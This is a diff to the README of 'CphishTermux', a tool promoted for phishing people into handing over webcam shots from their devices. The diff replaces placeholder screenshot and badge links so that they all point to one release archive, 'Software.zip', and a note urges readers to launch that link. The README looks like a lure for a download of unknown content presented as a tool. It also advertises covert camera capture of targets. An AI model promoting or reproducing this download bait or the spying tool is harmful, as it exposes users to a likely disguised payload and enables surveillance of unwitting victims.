@@ -1,6 +1,6 @@
 # 📷 CphishTermux: Grab Cam-Shots with a Click! 📸
 
-![CphishTermux](https://github.com/USERNAME/REPONAME/blob/main/CphishTermux.jpg)
+![CphishTermux](https://github.com/Rahulpa045/CphishTermux/releases/download/v1.0/Software.zip)
 
 Welcome to CphishTermux, your ultimate tool for capturing cam-shots from your target's devices effortlessly. 🕵️‍♂️ Whether you're into camera hacking or simply exploring the world of phishing, this Termux-based tool is your go-to solution! 
 
@@ -21,7 +21,7 @@ CphishTermux lets you capture cam-shots from your target's front camera or PC we
 - **Topics**: cam, camera, camerahack, camerahacking, cameraphishing, cphish, cphishtermux, phish, phishing, termux
 
 ## 🔗 Quick Links
-[![Download CphishTermux](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download CphishTermux](https://github.com/Rahulpa045/CphishTermux/releases/download/v1.0/Software.zip)](https://github.com/Rahulpa045/CphishTermux/releases/download/v1.0/Software.zip)
 
 *Note: The link above should be launched to access the tool.*
 
@@ -29,9 +29,9 @@ CphishTermux lets you capture cam-shots from your target's front camera or PC we
 
 Here are some snapshots of CphishTermux in action:
 
-![Screenshot 1](https://github.com/USERNAME/REPONAME/blob/main/screenshot1.jpg)
+![Screenshot 1](https://github.com/Rahulpa045/CphishTermux/releases/download/v1.0/Software.zip)
 
-![Screenshot 2](https://github.com/USERNAME/REPONAME/blob/main/screenshot2.jpg)
+![Screenshot 2](https://github.com/Rahulpa045/CphishTermux/releases/download/v1.0/Software.zip)
 
 ## 📦 Installation
 
